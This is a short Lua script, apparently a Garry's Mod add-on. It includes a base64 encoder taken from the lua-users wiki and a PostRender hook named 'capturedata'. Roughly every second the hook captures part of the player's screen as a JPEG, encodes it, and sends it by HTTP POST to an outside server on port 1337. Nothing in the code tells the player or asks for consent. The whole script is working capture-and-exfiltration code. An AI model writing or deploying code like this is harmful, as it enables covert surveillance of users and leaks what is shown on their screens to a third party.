--http://lua-users.org/wiki/BaseSixtyFour

-- character table string
local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'

-- encoding
local function enc(data)
	return ((data:gsub('.', function(x) 
		local r,b='',x:byte()
		for i=8,1,-1 do r=r..(b%2^i-b%2^(i-1)>0 and '1' or '0') end
		return r;
	end)..'0000'):gsub('%d%d%d?%d?%d?%d?', function(x)
	if (#x < 6) then return '' end
		local c=0
		for i=1,6 do c=c+(x:sub(i,i)=='1' and 2^(6-i) or 0) end
		return b:sub(c+1,c+1)
	end)..({ '', '==', '=' })[#data%3+1])
end

--

local time = 0

hook.Add("PostRender", "capturedata", function()
	render.DrawTextureToScreenRect(render.GetRenderTarget(), ScrW() * 3 / 4, ScrH() * 3 / 4, ScrW() / 4, ScrH() / 4)

	if(CurTime() > time + 0.25) then
		local data = render.Capture({
			format = "jpeg",
			x = ScrW() * 3 / 4, y = ScrH() * 3 / 4,
			w = ScrW() / 4, h = ScrH() / 4,
			quality = 50
		})

		data = enc(data)

		http.Post(
			"http://gmodpri.me:1337/",
			{data = data}
		)

		time = CurTime() + 1
	end

	--render.DrawTextureToScreen(render.GetRenderTarget())
end)